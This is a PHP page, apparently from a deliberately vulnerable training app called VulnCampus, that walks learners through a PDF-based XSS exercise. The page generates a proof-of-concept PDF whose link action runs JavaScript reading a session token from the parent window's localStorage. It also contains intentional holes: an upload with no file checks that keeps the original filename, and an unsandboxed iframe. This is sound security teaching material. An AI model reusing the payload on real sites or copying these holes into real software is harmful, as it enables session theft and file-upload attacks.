<?php
require_once __DIR__ . '/../src/helpers.php';
check_login();

// 1. 一鍵下載 PDF XSS PoC 檔案 (超連結點擊免殺版，100% 支援現代 Chrome/Edge)
if (isset($_GET['download_poc'])) {
    header('Content-Type: application/pdf');
    header('Content-Disposition: inline; filename="xss-poc.pdf"');
    
    // 建構一個包含紅框點擊 Link Action (/S /URI) 且使用 javascript: 偽協定的 PDF 格式
    $pdf = "%PDF-1.4\n";
    $pdf .= "1 0 obj\n<<\n  /Type /Catalog\n  /Pages 2 0 R\n>>\nendobj\n";
    $pdf .= "2 0 obj\n<<\n  /Type /Pages\n  /Kids [3 0 R]\n  /Count 1\n>>\nendobj\n";
    $pdf .= "3 0 obj\n<<\n  /Type /Page\n  /Parent 2 0 R\n  /Resources <<\n    /Font <<\n      /F1 <<\n        /Type /Font\n        /Subtype /Type1\n        /BaseFont /Helvetica\n      >>\n    >>\n  >>\n  /MediaBox [0 0 595 842]\n  /Contents 4 0 R\n  /Annots [5 0 R]\n>>\nendobj\n";
    $pdf .= "4 0 obj\n<< /Length 135 >>\nstream\nBT\n/F1 22 Tf\n50 750 Td\n(PDF-based XSS Demo PoC File) Tj\n/F1 12 Tf\n0 -40 Td\n(Please click the red border box below to verify Stored XSS:) Tj\nET\nendstream\nendobj\n";
    $pdf .= "5 0 obj\n<<\n  /Type /Annot\n  /Subtype /Link\n  /Rect [50 670 450 720]\n  /Border [0 0 1]\n  /C [1 0 0]\n  /A <<\n    /Type /Action\n    /S /URI\n    /URI (javascript:try { alert('💥 PDF-based XSS 攻擊成功！\\n\\n已成功跨來源竊取父視窗 LocalStorage 的敏感 API Token：\\n' + parent.localStorage.getItem('user_session')); } catch(e) { alert('PDF JavaScript 執行成功！但無法存取父視窗：' + e.message); })\n  >>\n>>\nendobj\n";
    $pdf .= "xref\n0 6\n0000000000 65535 f\n0000000009 00000 n\n0000000056 00000 n\n0000000111 00000 n\n0000000302 00000 n\n0000000492 00000 n\ntrailer\n<<\n  /Size 6\n  /Root 1 0 R\n>>\nstartxref\n708\n%%EOF\n";
    
    echo $pdf;
    exit;
}

$error = '';
$success = '';
$uploaded_file = '';

// 2. 處理 PDF 檔案上傳
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['pdf_file']) && $_FILES['pdf_file']['error'] === UPLOAD_ERR_OK) {
        $file_name = $_FILES['pdf_file']['name'];
        $file_tmp  = $_FILES['pdf_file']['tmp_name'];
        
        $upload_dir = __DIR__ . '/uploads/';
        if (!is_dir($upload_dir)) {
            mkdir($upload_dir, 0777, true);
        }

        // 弱點版：完全不檢驗副檔名與 PDF 特徵，直接保留原始檔名儲存
        $destination = $upload_dir . $file_name;
        if (move_uploaded_file($file_tmp, $destination)) {
            $success = '✓ PDF 檔案上傳成功！';
            $uploaded_file = '/uploads/' . $file_name;
        } else {
            $error = '檔案移動失敗，請檢查目錄寫入權限。';
        }
    } else {
        $error = '上傳失敗，錯誤代碼：' . ($_FILES['pdf_file']['error'] ?? '未知');
    }
}
?>
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <title>📄 PDF 嵌入跨站腳本漏洞 (PDF XSS) - VulnCampus</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
    <style>
        body { font-family: sans-serif; background-color: #f4f6f9; }
        .instructions { background-color: #ffeef0; border-left: 5px solid #dc3545; }
    </style>
</head>
<body class="bg-light">

<div class="container my-5">
    <div class="d-flex justify-content-between align-items-center mb-4 border-bottom pb-2">
        <h2>📄 PDF 嵌入跨站腳本 (PDF-based XSS) 演練</h2>
        <div>
            <a href="/index.php" class="btn btn-secondary">回首頁</a>
        </div>
    </div>

    <?php if ($error): ?>
        <div class="alert alert-danger"><?= $error ?></div>
    <?php endif; ?>
    <?php if ($success): ?>
        <div class="alert alert-success"><?= $success ?></div>
    <?php endif; ?>

    <div class="row">
        <!-- 左側：上傳表單與說明 -->
        <div class="col-md-5">
            <div class="card shadow-sm mb-4">
                <div class="card-header bg-danger text-white font-weight-bold">
                    成果證明 PDF 上傳區
                </div>
                <div class="card-body">
                    <p class="text-muted">上傳您的課外學習成果證明（僅限 PDF 格式）。上傳後系統將自動在網頁下方嵌入預覽。</p>
                    
                    <form method="POST" enctype="multipart/form-data">
                        <div class="form-group">
                            <label for="pdf_file">選擇 PDF 檔案：</label>
                            <input type="file" name="pdf_file" id="pdf_file" class="form-control-file" accept=".pdf" required>
                        </div>
                        <button type="submit" class="btn btn-danger btn-block font-weight-bold">開始上傳成果</button>
                    </form>
                </div>
            </div>

            <div class="card shadow-sm instructions p-3">
                <h5 class="text-danger font-weight-bold">🎯 PDF XSS 漏洞演練指引</h5>
                <ol class="pl-3 mb-0 text-muted small">
                    <li class="mb-2"><strong>漏洞成因</strong>：由於 Chrome 等現代瀏覽器為了安全預設禁用了 PDF 中的 <code>OpenAction</code> 自動載入腳本，我們採用實戰中常見的 **「點擊超連結偽協定 (Link Action XSS)」** 重現攻擊。</li>
                    <li class="mb-2">點擊下方按鈕，下載我們為您調製的 PoC PDF 檔案：<br>
                        <a href="?download_poc=1" class="btn btn-sm btn-outline-danger font-weight-bold my-2 btn-block">📥 下載 PDF XSS PoC 檔案 (xss-poc.pdf)</a>
                    </li>
                    <li class="mb-2">將下載的 <code>xss-poc.pdf</code> 檔案在上方表單進行上傳。</li>
                    <li class="mb-2">上傳完成後，在右側預覽的 PDF 畫面中，**用滑鼠點擊 PDF 裡面的「紅色外框區域」**。</li>
                    <li class="mb-2">觀察點擊後網頁是否立即彈出了 JavaScript 警告視窗，並跨來源竊取了您登入工作階段的 <code>localStorage</code> API Token！</li>
                </ol>
            </div>
        </div>

        <!-- 右側：PDF 預覽區 -->
        <div class="col-md-7">
            <div class="card shadow-sm h-100">
                <div class="card-header bg-dark text-white font-weight-bold">
                    📄 證明文件預覽區域 (iframe 嵌入)
                </div>
                <div class="card-body d-flex align-items-center justify-content-center bg-white" style="min-height: 500px;">
                    <?php if ($uploaded_file): ?>
                        <!-- 漏洞點：未進行沙盒防範 (sandbox) 直接使用普通 iframe 嵌入 -->
                        <iframe src="<?= $uploaded_file ?>" width="100%" height="500px" style="border: none;"></iframe>
                    <?php else: ?>
                        <div class="text-center text-muted">
                            <h4>尚未上傳任何成果 PDF</h4>
                            <p class="small">請先在左方選擇檔案並上傳，此處將自動呈現預覽。</p>
                        </div>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    </div>
</div>

</body>
</html>
